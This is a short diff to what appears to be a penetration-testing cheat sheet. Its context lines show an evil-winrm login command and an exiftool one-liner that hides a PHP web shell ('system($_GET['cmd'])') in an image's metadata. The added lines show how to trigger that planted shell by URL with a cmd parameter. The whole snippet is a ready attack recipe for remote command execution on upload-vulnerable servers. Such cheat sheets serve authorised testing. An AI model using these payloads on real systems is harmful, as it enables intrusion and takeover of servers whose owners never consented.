@@ -481,6 +481,8 @@ evil-winrm -i IP_here -u user -p password
 ```
 # add php web shell to image
 exiftool -Comment='<?php system($_GET['cmd']); ?>' /path/to/image/here
+# call shell
+http://upload_url_here/fie_name_here?cmd=command_here
 ```
 
 
